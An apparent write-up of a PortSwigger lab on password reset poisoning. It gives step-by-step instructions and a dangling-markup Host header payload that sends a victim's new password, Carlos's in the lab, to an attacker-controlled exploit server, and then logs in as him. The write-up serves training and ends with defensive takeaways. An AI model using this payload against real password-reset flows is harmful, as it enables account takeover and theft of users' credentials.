#  Password Reset Poisoning via Dangling Markup

## 📌 Lab Details
- **Title**: Password Reset Poisoning via Dangling Markup
- **Difficulty**: Expert
- **Category**: HTTP Host header attacks
- **Lab URL**: https://portswigger.net/academy/labs/launch/cc59db27660d3e229c5a571225af7fbcb86b736ce42580c13b79df712f01f9ee?referrer=%2fweb-security%2fhost-header%2fexploiting%2fpassword-reset-poisoning%2flab-host-header-password-reset-poisoning-via-dangling-markup

## 🔍 Summary
When a user requests a password result, the application generates an email containing a login link. The application reflects the `Host` header inside the email HTML wihtout properly escaping special characters. <br>
By injecting a malicious payload into the `Host` header, it is possible to break out of the existing HTML context and create a dangling `<a>` tag. This causes the remainder of the email content, including the newly generated password, to become part of a URL pointing to an attacker-controlled server. <br>
When the email is processed by a browser, email client, or automated link scanner, a request is sent to the attacker-controlled server, leaking the password in the request URL. <br>
The goal is to obtain Carlos's newly generated password and log in to his account.

## 🛠 Steps to Solve
1. Go to the login page and request a password reset for your own account.
2. Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text.
3. In the proxy history, study the response to the `GET /email` request. Observe that the HTML content for your email is written to a string, but this is being sanitized using the `DOMPurify` library before it is rendered by the browser.
4. In the email client, notice that you have the option to view each email as raw HTML instead. Unlike the rendered version of the email, this does not appear to be sanitized in any way.
5. Send the `POST /forgot-password` request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email.
6. In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password.
7. Send the `POST /forgot-password` request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server: `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
8. Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins GET /?/login'>[…], which contains the rest of the email body, including the new password.
9. In Burp Repeater, send the request one last time, but change the `username` parameter to `carlos`. Refresh the access log and obtain Carlos's new password from the corresponding log entry.
10. Log in as `carlos` using this new password to solve the lab.

## 📖 Key Takeaways
- Never trust the `Host` header when generating password reset links or email content.
- HTML content included in emails must be properly escaped before rendering.
- Dangling markup injection can leak sensitive information without requiring JavaScript execution.
- Email scanners and security tools often automatically follow links, making exploitation easier.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1b7ffa3a-34cd-4217-b8d4-ea2119462700" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/09207492-670a-4ac6-a2e3-98e324a6ec56" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e31379c4-77fa-488b-bc55-7ac380522a8f" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cef1e2da-8e43-4117-87af-d436a9c7e3f0" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a9ff9876-8581-4139-a62e-6da3b566f9aa" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/78da449e-11d8-4ba4-a7df-1c5b46df2620" />
